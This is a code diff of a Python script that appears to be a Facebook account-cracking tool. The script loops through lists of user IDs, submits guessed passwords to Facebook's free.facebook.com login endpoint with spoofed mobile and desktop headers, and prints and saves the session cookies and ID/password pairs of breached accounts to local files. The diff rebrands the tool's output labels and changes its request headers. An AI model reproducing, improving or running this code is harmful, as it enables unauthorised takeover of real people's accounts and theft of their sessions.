@@ -410,11 +410,10 @@ def i():
 
         tl = str(len(user))
 
-        print('\033[38;5;192m TOTAL IDS: \033[38;5;46m'+tl)
-        print('\033[38;5;192m THE PROCESS HAS BEEN STARTED')
-        print('\033[38;5;192m USE AEROPLANE MOOD IN EVERY 4 MIN ')
-        print(' \033[38;5;45mS-Saimon \033[38;5;46m/ \033[38;5;45mH-HASAN\033[38;5;45m We Are Brother💚')
-        print(' \033[38;5;46mWorking Data + Wifi ')
+        print('\x1b[1;97m TOTAL IDS: \033[38;5;46m'+tl)
+        print('\x1b[1;97m THE PROCESS HAS BEEN STARTED')
+        print('\x1b[1;97m USE AEROPLANE MOOD IN EVERY 4 MIN ')
+        print(' \x1b[1;97mWORKING&DATA WIFI ')
         print(' \x1b[1;97m===================================================')
         for love in user:
             pwx = [love[1:]]
@@ -450,44 +449,40 @@ def rcrack(uid,pwx,tl):
             header_freefb = {"authority": 'free.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            "accept-language": 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            "referer": 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
             "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
+            "sec-ch-ua-platform": '"Android"',
             "sec-fetch-dest": 'document',
             "sec-fetch-mode": 'navigate',
             "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            'user-agent':'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'}
+            "sec-fetch-user": '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(' \033[38;5;46m[HASAN-OK💉]  ' +uid+ ' | ' +ps+    '  \n \033[38;5;195mCookie 🍪= \033[38;5;192m'+coki+  ' \n \033[38;5;45mUsar Agent 👾= \033[38;5;126m'+pro+'  \033[0;97m')
+                print(' \033[38;5;46m[R4FSAN-OK]  ' +uid+ ' | ' +ps+    '  \n \033[38;5;195mCookie 🍪= \033[38;5;192m'+coki+  ' \n \033[38;5;45mUsar Agent 👾= \033[38;5;126m'+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/R4FSAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print( ' \033[38;5;196m[HASAN-CP💔]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/HASAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                print( ' \033[38;5;196m[R4FSAN-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/R4FSAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r %s[HASAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r %s[R4FSAN-XD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
